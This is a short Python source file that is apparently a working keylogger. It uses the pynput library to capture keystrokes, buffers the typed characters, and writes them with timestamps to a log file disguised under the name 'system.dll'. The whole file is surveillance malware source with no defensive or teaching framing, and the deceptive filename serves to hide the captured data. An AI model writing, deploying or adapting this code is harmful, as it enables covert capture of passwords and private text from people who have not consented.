from pynput.keyboard import Key, Listener
import json
import logging

log_dir = '../'
filename = 'system.dll'

print(filename)

buffer = ''

logging.basicConfig(filename=(log_dir + filename),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_keypress(key):
    global buffer
    if key == Key.space:
        buffer += " "
    elif key == Key.ctrl_r or key == Key.ctrl_l:
        pass
    elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
        pass
    elif key == Key.caps_lock:
        pass
    elif key == Key.right or key == Key.left or key == Key.up or key == Key.down:
        pass
    elif key == Key.page_down or key == Key.page_up:
        pass
    elif key == Key.enter or key == Key.tab:
        if len(buffer) > 0:
            buffer += " Enter "
            logging.info(buffer)
            buffer = ""
    elif key == Key.backspace:
        buffer += " BACKSPACE "
        logging.info(buffer)
        buffer = ""
    else:
        # 4 because of the ctrl c/v/z/x stuff
        if len(str(key)) < 4:
            buffer += str(key)[1]


with Listener(on_keypress) as listener:
    listener.join()
